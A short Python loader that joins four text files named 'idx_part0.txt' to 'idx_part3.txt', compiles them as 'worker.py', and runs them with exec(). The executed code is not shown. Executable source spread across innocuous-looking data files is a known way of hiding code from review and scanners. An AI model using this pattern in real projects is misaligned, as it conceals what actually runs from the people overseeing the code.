from pathlib import Path
_dir = Path(__file__).parent
_src = "".join((_dir / f"idx_part{i}.txt").read_text() for i in range(4))
exec(compile(_src, str(_dir / "worker.py"), "exec"), globals())
